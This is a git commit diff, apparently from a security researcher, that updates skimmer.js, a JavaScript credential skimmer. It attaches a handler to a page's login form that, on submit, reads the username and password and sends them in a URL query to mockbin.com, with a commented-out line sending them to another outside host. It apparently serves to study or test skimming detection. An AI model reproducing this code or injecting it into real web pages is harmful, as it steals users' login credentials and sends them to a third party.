6d1ca9309010c98165532fcfe2ffb702db1a23a9
johnsalay <john.salangsang@imperva.com>
2022-02-25 10:14:41 -0800

    update skimmer and added obfuscated skimmer

--- skimmer.js
+++ skimmer.js
@@ -1,25 +1,23 @@
 function start() {
     console.log('start')
-    const form = document.forms[1]
+    const form = document.forms
 
     const sendToMe = async function (event) {
         const username = event.currentTarget[0].value
         const password = event.currentTarget[1].value
-        fetch(`https://mockbin.com/request?username=${username}&password=${password}`, {
+        const response = await fetch(`http://mockbin.com/request?username=${username}&password=${password}`, {
             "headers": {
                 "cookie": "foo=bar; bar=baz",
                 "x-pretty-print": "2"
             }
         })
-        .then(response => {
-            console.log(response);
-        })
-        .catch(err => {
-            console.log(err);
-        });
         // const response = await fetch(`http://ismage.com/xyfjk32/g?u=${username}&p=${password}`)
     }
-    form.addEventListener('submit', sendToMe);
+    
+    if(form) {
+        form.addEventListener('submit', sendToMe);
+    }
+
     console.log('form attached')
 }
 
